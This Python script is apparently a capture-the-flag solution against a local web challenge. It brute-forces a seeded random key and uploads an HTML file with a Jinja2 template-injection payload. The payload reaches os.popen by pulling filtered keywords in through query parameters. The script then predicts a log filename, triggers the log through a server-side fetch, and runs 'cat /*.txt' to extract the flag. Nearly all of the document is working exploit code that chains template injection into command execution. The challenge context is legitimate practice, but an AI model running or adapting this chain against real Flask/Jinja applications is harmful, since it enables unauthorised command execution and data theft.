import requests
import re
import random
import time
from urllib.parse import quote

# Target configuration
TARGET_URL = "http://127.0.0.1:1337"

def get_random_key():
    print("[*] Recovering randomKey...")
    try:
        # Trigger benign file processing to get server time and file ID
        r = requests.post(f"{TARGET_URL}/fetch", data={'url': f"http://127.0.0.1:1337/"})
        
        t_match = re.search(r"File processed at (\d+)", r.text)
        id_match = re.search(r"File Name\s+:\s+(\d+)", r.text)
        
        if not t_match or not id_match:
            print("[-] Failed to parse time or ID.")
            return None
        server_time = int(t_match.group(1))
        file_id = int(id_match.group(1))
        print(f"[*] Server Time: {server_time}, File ID: {file_id}")
        
        # Brute-force the key (1000-10000)
        for k in range(1000, 10001):
            random.seed(server_time + k)
            if random.randint(1, 1000000000) == file_id:
                print(f"[+] Found randomKey: {k}")
                return k
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def generate_payload():
    """
    Constructs the payload using config.__class__.__init__.__globals__['os'].
    
    Improvements:
    1. Fetches a quote character (") from query params to wrap the content attribute.
    2. Uses <meta name=description content="..."> to reliably extract the full output via ExifTool.
    3. Replaces { } with ( ) to prevent recursive security incident triggering.
    """
    payload = """
    {% set req = request %}
    {% set cfg = config %}
    
    {# Generate Slash for closing tags #}
    {% set p = dict(path=1)|list|first %}
    {% set slash = req|attr(p)|first %}

    {# Helpers to access URL parameters #}
    {% set args_s = dict(args=1)|list|first %}
    {% set get_s = dict(get=1)|list|first %}
    {% set qs = req|attr(args_s) %}
    {% set get = qs|attr(get_s) %}
    
    {# Fetch Forbidden Strings from Query Params #}
    {% set s_c = get(dict(c=1)|list|first) %}    {# __class__ #}
    {% set s_i = get(dict(i=1)|list|first) %}    {# __init__ #}
    {% set s_gl = get(dict(gl=1)|list|first) %}  {# __globals__ #}
    {% set s_gi = get(dict(gi=1)|list|first) %}  {# __getitem__ #}
    {% set s_os = get(dict(o=1)|list|first) %}   {# os #}
    {% set s_po = get(dict(p=1)|list|first) %}   {# popen #}
    {% set s_rd = get(dict(r=1)|list|first) %}   {# read #}
    {% set s_cmd = get(dict(cmd=1)|list|first) %}{# cmd #}
    {% set s_q = get(dict(q=1)|list|first) %}    {# " (quote) #}
    
    {# Replacement chars #}
    {% set s_ob = get(dict(ob=1)|list|first) %}  {# { #}
    {% set s_cb = get(dict(cb=1)|list|first) %}  {# } #}
    {% set s_lp = get(dict(lp=1)|list|first) %}  {# ( #}
    {% set s_rp = get(dict(rp=1)|list|first) %}  {# ) #}

    {# The Exploit Chain #}
    {% set cls = cfg|attr(s_c) %}
    {% set init = cls|attr(s_i) %}
    {% set g = init|attr(s_gl) %}
    {% set getitem = g|attr(s_gi) %}
    {% set os = getitem(s_os) %}
    {% set popen = os|attr(s_po) %}
    {% set res = popen(s_cmd) %}
    {% set output = res|attr(s_rd)() %}
    
    {# Output inside quoted meta tag #}
    <meta name=description content={{s_q}}{{ output|replace(s_ob, s_lp)|replace(s_cb, s_rp) }}{{s_q}}>
    """
    
    # HTML wrapper. The title must contain { } to trigger the log save.
    html = f"""<!DOCTYPE html>
<html>
<head>
<title>{{{{ dict(a=1) }}}}</title>
{payload}
<{{ slash }}head>
<body></body>
<{{ slash }}html>
"""
    return html

def solve():
    key = get_random_key()
    if not key:
        return

    # 1. Upload Payload
    print("[*] Uploading payload...")
    files = {'file': ('exploit.html', generate_payload())}
    r = requests.post(f"{TARGET_URL}/upload", files=files)
    
    match = re.search(r"Security Incident Detected at (\d+)", r.text)
    if not match:
        print("[-] Security incident not triggered.")
        return
    incident_time = int(match.group(1))
    print(f"[+] Incident triggered at {incident_time}")
    
    # 2. Predict Filename
    random.seed(incident_time + key)
    incident_id = str(random.randint(1, 1000000000))
    log_file = f"incident_{incident_id}.html"
    
    # 3. Trigger SSTI via SSRF
    params = {
        'c': '__class__',
        'i': '__init__',
        'gl': '__globals__',
        'gi': '__getitem__',
        'o': 'os',
        'p': 'popen',
        'r': 'read',
        'cmd': 'cat /*.txt',
        'q': '"',
        'ob': '{',
        'cb': '}',
        'lp': '(',
        'rp': ')'
    }
    
    qs = "&".join([f"{k}={quote(v)}" for k, v in params.items()])
    target = f"http://127.0.0.1:1337/logs/{log_file}?{qs}"
    
    print(f"[*] Fetching log: {log_file}")
    r_final = requests.post(f"{TARGET_URL}/fetch", data={'url': target})
    
    # 4. Extract Flag
    # Search for blahaj(...)
    flag_match = re.search(r"(blahaj\(.*?\))", r_final.text)
    if flag_match:
        flag = flag_match.group(1).replace('(', '{').replace(')', '}')
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        # Fallback: check Description field
        desc_match = re.search(r"Description\s+:\s+(.*)", r_final.text)
        if desc_match:
            raw = desc_match.group(1)
            fixed = raw.replace('(', '{').replace(')', '}')
            print(f"\n[+] FLAG FOUND (via Description): {fixed}")
        else:
            print("[-] Flag not found. Response head:")
            print(r_final.text[:1000])

if __name__ == "__main__":
    solve()